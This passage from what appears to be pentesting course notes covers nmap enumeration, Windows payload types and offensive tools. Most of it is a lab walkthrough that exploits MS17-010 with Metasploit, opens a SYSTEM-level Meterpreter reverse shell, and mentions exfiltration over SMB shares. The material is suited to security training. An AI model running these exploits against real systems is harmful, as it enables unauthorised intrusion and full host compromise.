+</span></span></code></pre></div><h4 id="banner-grab-to-enumerate-ports">Banner Grab to Enumerate Ports<a hidden class="anchor" aria-hidden="true" href="#banner-grab-to-enumerate-ports">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -v ip --script banner.nse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-09-20 18:01 EDT
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">1</span> scripts <span style="color:#66d9ef">for</span> scanning.
+</span></span><span style="display:flex;"><span>&lt;snip&gt;
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 912/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 902/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 18:01, 1.46s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 192.168.86.39.
+</span></span><span style="display:flex;"><span>Initiating NSE at 18:01
+</span></span><span style="display:flex;"><span>Completed NSE at 18:01, 20.11s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> desktop-jba7h4t.lan <span style="color:#f92672">(</span>192.168.86.39<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.012s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">994</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span>443/tcp open  https
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>902/tcp open  iss-realsecure
+</span></span><span style="display:flex;"><span>| banner: <span style="color:#ae81ff">220</span> VMware Authentication Daemon Version 1.10: SSL Required, Se
+</span></span><span style="display:flex;"><span>|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
+</span></span><span style="display:flex;"><span>912/tcp open  apex-mesh
+</span></span><span style="display:flex;"><span>| banner: <span style="color:#ae81ff">220</span> VMware Authentication Daemon Version 1.0, ServerDaemonProto
+</span></span><span style="display:flex;"><span>|_col:SOAP, MKSDisplayProtocol:VNC , ,
+</span></span><span style="display:flex;"><span>MAC Address: DC:41:A9:FB:BA:26 <span style="color:#f92672">(</span>Intel Corporate<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="bats-dlls--msi-files-oh-my">Bats, DLLs, &amp; MSI Files, Oh My!<a hidden class="anchor" aria-hidden="true" href="#bats-dlls--msi-files-oh-my">#</a></h2>
+<h4 id="payload-types-to-consider">Payload Types to Consider<a hidden class="anchor" aria-hidden="true" href="#payload-types-to-consider">#</a></h4>
+<ul>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library">DLLs</a> A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.</p>
+</li>
+<li>
+<p><a href="https://commandwindows.com/batch.htm">Batch</a> Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of <code>.bat</code>. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.</p>
+</li>
+<li>
+<p><a href="https://www.guru99.com/introduction-to-vbscript.html">VBS</a> VBScript is a lightweight scripting language based on Microsoft&rsquo;s Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.</p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions">MSI</a> <code>.MSI</code> files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run <code>msiexec</code> to execute our file, which will provide us with further access, such as an elevated reverse shell.</p>
+</li>
+<li>
+<p><a href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1">Powershell</a> Powershell is both a shell environment and scripting language. It serves as Microsoft&rsquo;s modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.</p>
+</li>
+</ul>
+<h2 id="tools-tactics-and-procedures-for-payload-generation-transfer-and-execution">Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution<a hidden class="anchor" aria-hidden="true" href="#tools-tactics-and-procedures-for-payload-generation-transfer-and-execution">#</a></h2>
+<h4 id="payload-generation">Payload Generation<a hidden class="anchor" aria-hidden="true" href="#payload-generation">#</a></h4>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Resource</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>MSFVenom &amp; Metasploit-Framework</code></td>
+          <td><a href="https://github.com/rapid7/metasploit-framework">Source</a> MSF is an extremely versatile tool for any pentester&rsquo;s toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.</td>
+      </tr>
+      <tr>
+          <td><code>Payloads All The Things</code></td>
+          <td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Source</a> Here, you can find many different resources and cheat sheets for payload generation and general methodology.</td>
+      </tr>
+      <tr>
+          <td><code>Mythic C2 Framework</code></td>
+          <td><a href="https://github.com/its-a-feature/Mythic">Source</a> The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.</td>
+      </tr>
+      <tr>
+          <td><code>Nishang</code></td>
+          <td><a href="https://github.com/samratashok/nishang">Source</a> Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.</td>
+      </tr>
+      <tr>
+          <td><code>Darkarmour</code></td>
+          <td><a href="https://github.com/bats3c/darkarmour">Source</a> Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="payload-transfer-and-execution">Payload Transfer and Execution:<a hidden class="anchor" aria-hidden="true" href="#payload-transfer-and-execution">#</a></h4>
+<ul>
+<li><code>Impacket</code>: <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with <code>psexec</code>, <code>smbclient</code>, <code>wmi</code>, Kerberos, and the ability to stand up an SMB server.</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md">Payloads All The Things</a>: is a great resource to find quick oneliners to help transfer files across hosts expediently.</li>
+<li><code>SMB</code>: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.</li>
+<li><code>Remote execution via MSF</code>: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.</li>
+<li><code>Other Protocols</code>: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.</li>
+</ul>
+<h2 id="example-compromise-walkthrough">Example Compromise Walkthrough<a hidden class="anchor" aria-hidden="true" href="#example-compromise-walkthrough">#</a></h2>
+<h4 id="enumerate-the-host">Enumerate the Host<a hidden class="anchor" aria-hidden="true" href="#enumerate-the-host">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -A 10.129.201.97
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-09-27 18:13 EDT
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">153</span> scripts <span style="color:#66d9ef">for</span> scanning.
+</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.129.201.97
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.201.97
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.129.201.97
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.129.201.97
+</span></span><span style="display:flex;"><span>Completed Connect Scan at 18:13, 12.76s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Completed Service scan at 18:13, 6.62s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.129.201.97.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.201.97
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed ports
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp  open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: 10.129.201.97 - /
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: SHELLS-WINBLUE
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: SHELLS-WINBLUE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2021-09-27T15:13:28-07:00
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: &lt;blank&gt;
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.02: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2021-09-27T22:13:30
+</span></span><span style="display:flex;"><span>|_  start_date: 2021-09-23T15:29:29
+</span></span></code></pre></div><h4 id="determine-an-exploit-path">Determine an Exploit Path<a hidden class="anchor" aria-hidden="true" href="#determine-an-exploit-path">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use auxiliary/scanner/smb/smb_ms17_010
+</span></span><span style="display:flex;"><span>show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/scanner/smb/smb_ms17_010<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name         Current Setting                 Required  Description
+</span></span><span style="display:flex;"><span>   ----         ---------------                 --------  -----------
+</span></span><span style="display:flex;"><span>   CHECK_ARCH   true                            no        Check <span style="color:#66d9ef">for</span> architecture on vulnerable hosts
+</span></span><span style="display:flex;"><span>   CHECK_DOPU   true                            no        Check <span style="color:#66d9ef">for</span> DOUBLEPULSAR on vulnerable hosts
+</span></span><span style="display:flex;"><span>   CHECK_PIPE   false                           no        Check <span style="color:#66d9ef">for</span> named pipe on vulnerable hosts
+</span></span><span style="display:flex;"><span>   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
+</span></span><span style="display:flex;"><span>                k/data/wordlists/named_pipes.t
+</span></span><span style="display:flex;"><span>                xt
+</span></span><span style="display:flex;"><span>   RHOSTS                                       yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts f
+</span></span><span style="display:flex;"><span>                                                          ile with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>   RPORT        <span style="color:#ae81ff">445</span>                             yes       The SMB service port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBDomain    .                               no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>   SMBPass                                      no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                                      no        The username to authenticate as
+</span></span><span style="display:flex;"><span>   THREADS      <span style="color:#ae81ff">1</span>                               yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; set RHOSTS 10.129.201.97
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.129.201.97
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.201.97:445     - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</span></span></code></pre></div><h4 id="choose--configure-our-exploit--payload">Choose &amp; Configure Our Exploit &amp; Payload<a hidden class="anchor" aria-hidden="true" href="#choose--configure-our-exploit--payload">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>search eternal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank     Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                           ---------------  ----     -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#66d9ef">for</span> Win8+
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</span></span></code></pre></div><h4 id="configure-the-exploit--payload">Configure The Exploit &amp; Payload<a hidden class="anchor" aria-hidden="true" href="#configure-the-exploit--payload">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>use <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_psexec<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_psexec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name                  Current Setting              Required  Description
+</span></span><span style="display:flex;"><span>   ----                  ---------------              --------  -----------
+</span></span><span style="display:flex;"><span>   DBGTRACE              false                        yes       Show extra debug trace info
+</span></span><span style="display:flex;"><span>   LEAKATTEMPTS          <span style="color:#ae81ff">99</span>                           yes       How many times to try to leak transaction
+</span></span><span style="display:flex;"><span>   NAMEDPIPE                                          no        A named pipe that can be connected to <span style="color:#f92672">(</span>leave bl
+</span></span><span style="display:flex;"><span>                                                                ank <span style="color:#66d9ef">for</span> auto<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
+</span></span><span style="display:flex;"><span>                         work/data/wordlists/named_p
+</span></span><span style="display:flex;"><span>                         ipes.txt
+</span></span><span style="display:flex;"><span>   RHOSTS                                             yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or h
+</span></span><span style="display:flex;"><span>                                                                osts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>   RPORT                 <span style="color:#ae81ff">445</span>                          yes       The Target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SERVICE_DESCRIPTION                                no        Service description to to be used on target <span style="color:#66d9ef">for</span>
+</span></span><span style="display:flex;"><span>                                                                 pretty listing
+</span></span><span style="display:flex;"><span>   SERVICE_DISPLAY_NAME                               no        The service display name
+</span></span><span style="display:flex;"><span>   SERVICE_NAME                                       no        The service name
+</span></span><span style="display:flex;"><span>   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
+</span></span><span style="display:flex;"><span>                                                                <span style="color:#f92672">(</span>ADMIN$,C$,...<span style="color:#f92672">)</span> or a normal read/write folder s
+</span></span><span style="display:flex;"><span>                                                                hare
+</span></span><span style="display:flex;"><span>   SMBDomain             .                            no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>   SMBPass                                            no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                                            no        The username to authenticate as
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     192.168.86.48    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span></code></pre></div><h4 id="validate-our-options">Validate Our Options<a hidden class="anchor" aria-hidden="true" href="#validate-our-options">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_psexec<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_psexec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name                  Current Setting              Required  Description
+</span></span><span style="display:flex;"><span>   ----                  ---------------              --------  -----------
+</span></span><span style="display:flex;"><span>   DBGTRACE              false                        yes       Show extra debug trace info
+</span></span><span style="display:flex;"><span>   LEAKATTEMPTS          <span style="color:#ae81ff">99</span>                           yes       How many times to try to leak transaction
+</span></span><span style="display:flex;"><span>   NAMEDPIPE                                          no        A named pipe that can be connected to <span style="color:#f92672">(</span>leave bl
+</span></span><span style="display:flex;"><span>                                                                ank <span style="color:#66d9ef">for</span> auto<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
+</span></span><span style="display:flex;"><span>                         work/data/wordlists/named_p
+</span></span><span style="display:flex;"><span>                         ipes.txt
+</span></span><span style="display:flex;"><span>   RHOSTS                10.129.201.97                yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or h
+</span></span><span style="display:flex;"><span>                                                                osts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>   RPORT                 <span style="color:#ae81ff">445</span>                          yes       The Target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SERVICE_DESCRIPTION                                no        Service description to to be used on target <span style="color:#66d9ef">for</span>
+</span></span><span style="display:flex;"><span>                                                                 pretty listing
+</span></span><span style="display:flex;"><span>   SERVICE_DISPLAY_NAME                               no        The service display name
+</span></span><span style="display:flex;"><span>   SERVICE_NAME                                       no        The service name
+</span></span><span style="display:flex;"><span>   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
+</span></span><span style="display:flex;"><span>                                                                <span style="color:#f92672">(</span>ADMIN$,C$,...<span style="color:#f92672">)</span> or a normal read/write folder s
+</span></span><span style="display:flex;"><span>                                                                hare
+</span></span><span style="display:flex;"><span>   SMBDomain             .                            no        The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>   SMBPass                                            no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                                            no        The username to authenticate as
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  thread           yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.12      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span></code></pre></div><h4 id="execute-our-attack">Execute Our Attack<a hidden class="anchor" aria-hidden="true" href="#execute-our-attack">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_psexec<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.12:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.201.97:445 - Target OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.201.97:445 - Built a write-what-where primitive...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.201.97:445 - Selecting PowerShell target
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.201.97:445 - Executing the payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.129.201.97:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.129.201.97
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.12:4444 -&gt; 10.129.201.97:50215<span style="color:#f92672">)</span> at 2021-09-27 18:58:00 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><h4 id="identify-our-shell">Identify Our Shell<a hidden class="anchor" aria-hidden="true" href="#identify-our-shell">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">4844</span> created.
